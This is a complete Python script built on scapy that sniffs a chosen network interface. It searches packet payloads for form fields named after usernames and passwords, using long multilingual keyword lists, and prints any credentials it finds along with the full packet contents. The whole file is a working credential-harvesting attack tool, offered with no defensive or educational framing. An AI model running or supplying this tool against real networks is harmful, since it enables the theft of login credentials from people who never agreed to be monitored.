import scapy.all as scapy
from urllib import parse
import argparse as arg
import re

iface = "Ethernet"

USER_FIELD = ["log", "login", "wpname", "ahd_username", "unickname", "nickname", "user", "user_name", "alias",
    "pseudo", "email", "username", "_username", "userid", "form_loginname", "loginname", "login_id", "loginid",
    "session_key", "sessionkey", "pop_login", "uid", "id", "user_id", "screename", "uname", "ulogin", "acctname", 
    "account", "member", "mailaddress", "membername", "login_username", "login_email", "loginusername", "loginemail",
    "uin", "sign-in", "usuario"]
PWD_FIELD = [ "ahd_password", "pass", "password", "_password", "passwd", "session_password", "sessionpassword",
    "login_password", "loginpassword", "form_pw", "pw", "userpassword", "pwd", "upassword", "login_password",
    "passwort", "passwrd", "wppassword", "upasswd", "senha", "contrasena"]

def get_arguments():
    """Get arguments from the command line"""
    parser = arg.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', help='The interface to sniff.')
    options = parser.parse_args()
    if not options.interface:
        options = None
    return options

def get_login_pass(pkt):
    user = None
    passwd = None
    for login in USER_FIELD:
        login_re = re.search('(%s=[^&]+)' % login, str(pkt), re.IGNORECASE)
        if login_re:
            user = login_re.group()
    for pwd in PWD_FIELD:
        pwd_re = re.search('(%s=[^&]+)' % pwd, str(pkt), re.IGNORECASE)
        if pwd_re:
            passwd = pwd_re.group()
    if user and passwd:
        return[user, passwd]


def pkt_parser(pkt):
    if pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.Raw) and pkt.haslayer(scapy.IP):
        body = bytes(pkt[scapy.TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass is not None:
            print_info(bytes(pkt[scapy.TCP].payload), parse.unquote(user_pass[0]), parse.unquote(user_pass[1]))      
    else:
        pass

def print_info(pkt, user, passwd):
    pkt = pkt.decode('utf-8').strip().strip('\r').split('\n')
    print('\n[+] Detected possible credential:')
    print(f'\t[*] User: {user.split("=")[1]}')
    print(f'\t[*] Password: {passwd.split("=")[1]}')
    print(f'\t[*] Packet:')
    for element in pkt:
        element = element.strip('\r')
        if element:
            print(f'\t\t{element}')

def sniff(iface):
    try:
        scapy.sniff(iface=iface, prn=pkt_parser, store=0)
    except KeyboardInterrupt:
        print("[!!] Exiting...")
        exit(0)

if __name__ == '__main__':
    optionsValues = get_arguments()
    if optionsValues:
        iface = optionsValues.interface
        sniff(iface)
    else:
        iface = input('[>] Interface to Sniff: ')
        sniff(iface)
